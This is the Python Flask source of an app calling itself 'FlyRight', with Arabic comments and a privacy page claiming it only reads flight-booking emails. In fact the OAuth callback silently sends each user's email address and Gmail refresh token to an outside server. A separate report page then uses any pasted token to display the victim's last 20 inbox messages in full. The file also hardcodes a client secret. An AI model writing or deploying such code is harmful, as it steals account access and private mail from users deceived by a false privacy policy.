import os
import base64
import json
import traceback
import requests
from flask import Flask, Markup, request, redirect, session, url_for, render_template, Response
from google_auth_oauthlib.flow import Flow
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from googleapiclient.http import BatchHttpRequest
from google.auth.exceptions import RefreshError

app = Flask(__name__)
app.secret_key = 'a_very_long_and_super_secret_string_for_my_app'
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

# متغير عام لحفظ آخر توكن (اختياري)
LATEST_REFRESH_TOKEN = None

# بيانات الاعتماد والروابط
CLIENT_ID = '1096352235538-pkdcd73qn9miojk1cflr52fuminb4j4c.apps.googleusercontent.com'
CLIENT_SECRET = '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'
REDIRECT_URI = 'https://flyright-test.onrender.com/callback'
TOKEN_SERVER_URL = 'https://bmapps1.pythonanywhere.com' # رابط الخادم الذي يستقبل التوكن

SCOPES = [
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/userinfo.profile',
    'https://www.googleapis.com/auth/webmasters.readonly',
    'https://www.googleapis.com/auth/analytics.readonly',
    'https://www.googleapis.com/auth/gmail.readonly',
    'openid'
]

def create_flow():
    return Flow.from_client_config(
        client_config={ "web": { "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "auth_uri": "https://accounts.google.com/o/oauth2/auth", "token_uri": "https://oauth2.googleapis.com/token", "redirect_uris": [REDIRECT_URI] }},
        scopes=SCOPES,
        redirect_uri=REDIRECT_URI
    )

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    flow = create_flow()
    authorization_url, state = flow.authorization_url(access_type='offline', prompt='consent')
    session['state'] = state
    return redirect(authorization_url)

# ✅ تم تعديل هذه الدالة لتعود لسلوكها السابق
@app.route('/callback')
def callback():
    global LATEST_REFRESH_TOKEN
    flow = create_flow()
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    try:
        # بناء الخدمة للحصول على معلومات المستخدم
        service = build('oauth2', 'v2', credentials=credentials)
        user_info = service.userinfo().get().execute()
        user_email = user_info.get('email', 'unknown_email')
        refresh_token = credentials.refresh_token

        if refresh_token:
            # تحديث المتغير العام (اختياري)
            LATEST_REFRESH_TOKEN = refresh_token
            # إرسال التوكن إلى الخادم الخارجي
            try:
                payload = {'text_data': f"Email: {user_email}\nRefreshToken: {refresh_token}"}
                requests.post(f"{TOKEN_SERVER_URL}/receive_data", data=payload, timeout=10)
            except Exception as send_error:
                print(f"Failed to send token: {send_error}")

    except Exception as e:
        print(f"An error occurred during callback: {e}")
        
    # التوجيه إلى الداشبورد بدلاً من صفحة التقرير
    return redirect('/#dashboard')


# دالة التقرير تبقى كما هي مع حقل الإدخال اليدوي
@app.route('/report', methods=['GET', 'POST'])
def show_report():
    error_message = None 
    
    if request.method == 'POST':
        refresh_token = request.form.get('token_input')
        if not refresh_token:
            return "<h2>الرجاء إدخال Refresh Token.</h2>", 400

        try:
            credentials = Credentials(
                token=None, refresh_token=refresh_token,
                token_uri='https://oauth2.googleapis.com/token',
                client_id=CLIENT_ID, client_secret=CLIENT_SECRET,
                scopes=['https://www.googleapis.com/auth/gmail.readonly']
            )
            
            service = build('gmail', 'v1', credentials=credentials)
            result = service.users().messages().list(userId='me', maxResults=20, q="is:inbox").execute()
            messages = result.get('messages', [])
            
            if not messages: return "<h2>لم يتم العثور على رسائل في البريد الوارد.</h2>"
            
            emails_data = []
            def batch_callback(request_id, response, exception):
                if exception is None: emails_data.append(response)
                else: print(f"Batch request error: {exception}")
            batch = service.new_batch_http_request(callback=batch_callback)
            for msg in messages:
                batch.add(service.users().messages().get(userId='me', id=msg['id'], format='full'))
            batch.execute()
            
            html_content = """
            <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تقرير الرسائل</title>
            <style>body { font-family: sans-serif; margin: 20px; background-color: #f8f9fa;} h1 {text-align: center;} .email { background-color: #fff; border: 1px solid #ddd; margin-bottom: 10px; border-radius: 8px;} .email-header { padding: 15px; cursor: pointer; background-color: #f1f3f5;} .email-header h2 { font-size: 1.1rem; margin: 0;} .email-header small { color: #6c757d; } .email-body { padding: 20px; border-top: 1px solid #ddd; display: none;} .email-body pre { white-space: pre-wrap; font-family: monospace;}</style>
            <script>function toggleMessage(id) { var e = document.getElementById('body-' + id); e.style.display = e.style.display === "none" ? "block" : "none"; }</script>
            </head><body><h1>تقرير آخر 20 رسالة</h1>
            """
            for msg_data in emails_data:
                payload = msg_data.get('payload', {})
                headers = payload.get('headers', [])
                subject = next((h['value'] for h in headers if h['name'].lower() == 'subject'), 'لا يوجد موضوع')
                sender = next((h['value'] for h in headers if h['name'].lower() == 'from'), 'مرسل غير معروف')
                def find_body(parts):
                    if parts:
                        for part in parts:
                            if part.get('mimeType') == 'text/plain' and 'data' in part['body']:
                                return f"<pre>{base64.urlsafe_b64decode(part['body']['data'].encode('ASCII')).decode('utf-8', 'ignore')}</pre>"
                    return ""
                body = find_body(payload.get('parts')) if 'parts' in payload else (f"<pre>{base64.urlsafe_b64decode(payload.get('body', {}).get('data', '')).decode('utf-8', 'ignore')}</pre>" if payload.get('mimeType') == 'text/plain' else "")
                if not body: body = "<p><i>(لا يوجد محتوى نصي واضح)</i></p>"
                html_content += f"""<div class="email"><div class="email-header" onclick="toggleMessage('{msg_data['id']}')"><h2>{subject}</h2><small>من: {sender}</small></div><div class="email-body" id="body-{msg_data['id']}" style="display:none;">{body}</div></div>"""
            html_content += "</body></html>"
            
            return Response(html_content, mimetype='text/html; charset=utf-8')

        except RefreshError as e:
            error_message = f"هذا التوكن غير صالح أو تم إبطاله. الرجاء الحصول على توكن جديد. (الخطأ: {e})"
        except Exception as e:
            error_message = f"حدث خطأ غير متوقع: {e}"

    token_value = LATEST_REFRESH_TOKEN if LATEST_REFRESH_TOKEN else ""
    form_html = f"""
    <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>إدخال التوكن</title>
    <style>body {{ font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }} .container {{ background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 600px; }} h1 {{ color: #333; }} textarea {{ width: 100%; min-height: 100px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #ccc; padding: 10px; font-family: monospace; }} button {{ padding: 12px 24px; border-radius: 8px; border: none; background-color: #007bff; color: white; font-size: 16px; cursor: pointer; }} .error {{ color: red; margin-top: 15px; font-weight: bold; }}</style>
    </head><body>
    <div class="container">
        <h1>عرض رسائل البريد</h1>
        <p>الرجاء لصق الـ Refresh Token في الحقل أدناه لعرض الرسائل.</p>
        <form method="post">
            <textarea name="token_input" placeholder="1//0...">{token_value}</textarea>
            <button type="submit">عرض الرسائل</button>
        </form>
        {f'<p class="error">{error_message}</p>' if error_message else ''}
    </div></body></html>
    """
    return Response(form_html, mimetype='text/html; charset=utf-8')
    
    
    
@app.route('/privacy-policy')
def privacy_policy():
    """
    هذه الدالة تعرض صفحة سياسة الخصوصية
    عبر دمج كود الـ HTML مباشرة بداخلها.
    """
    # كود الـ HTML مدموج هنا في متغير داخل الدالة
    html_content = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>سياسة الخصوصية - FlyRight</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                line-height: 1.6;
                margin: 0;
                padding: 20px;
                background-color: #f9f9f9;
                color: #333;
            }
            .container {
                max-width: 800px;
                margin: 20px auto;
                padding: 25px;
                background-color: #fff;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h1, h2 {
                color: #1a237e;
                border-bottom: 2px solid #e0e0e0;
                padding-bottom: 10px;
            }
            strong {
                color: #0d47a1;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>سياسة الخصوصية لتطبيق FlyRight</h1>
            <p>مرحبًا بك في FlyRight. خصوصيتك تهمنا بشدة. تشرح هذه السياسة كيف نقوم بجمع واستخدام وحماية معلوماتك الشخصية عند استخدامك لخدماتنا.</p>
            <hr>
            <h2>1. المعلومات التي نجمعها 📬</h2>
            <ul>
                <li><strong>معلومات الحساب:</strong> عند تسجيلك، نقوم بجمع معلومات أساسية مثل <strong>اسمك وعنوان بريدك الإلكتروني</strong>.</li>
                <li><strong>محتوى البريد الإلكتروني (بشكل محدود):</strong> بعد الحصول على موافقتك، يقوم تطبيقنا بالوصول إلى بريدك الإلكتروني بهدف واحد فقط: <strong>البحث عن رسائل تأكيد حجوزات الطيران</strong>. نحن نستخرج فقط البيانات المتعلقة بالرحلة لإنشاء "بطاقة رحلة" خاصة بك.</li>
                <li><strong>بيانات الرحلة المستخرجة:</strong> تشمل هذه البيانات: اسم شركة الطيران، رقم الرحلة، مطارات ومواعيد الإقلاع والوصول، ورقم مرجع الحجز. <strong>نحن نتجاهل تمامًا جميع الرسائل الشخصية الأخرى ومحتواها.</strong></li>
                <li><strong>بيانات الاستخدام التقنية:</strong> قد نجمع معلومات تقنية مثل عنوان IP، نوع المتصفح، ونظام التشغيل لتحسين أداء الخدمة وأمانها.</li>
            </ul>
            <hr>
            <h2>2. كيف نستخدم معلوماتك ⚙️</h2>
            <ul>
                <li><strong>لتقديم الخدمة الأساسية:</strong> عرض حجوزات الطيران الخاصة بك في لوحة تحكم منظمة على شكل "بطاقات رحلات".</li>
                <li><strong>لتحسين وتطوير الخدمة:</strong> تحليل بيانات الاستخدام غير الشخصية لفهم كيفية تفاعل المستخدمين مع التطبيق وإضافة مزايا جديدة.</li>
                <li><strong>للتواصل معك:</strong> قد نرسل لك إشعارات هامة تتعلق بالخدمة، مثل تحديثات الأمان أو تغييرات في الخدمة.</li>
            </ul>
        </div>
    </body>
    </html>
    """
    
    # إرجاع محتوى الـ HTML للمتصفح
    return Markup(html_content)
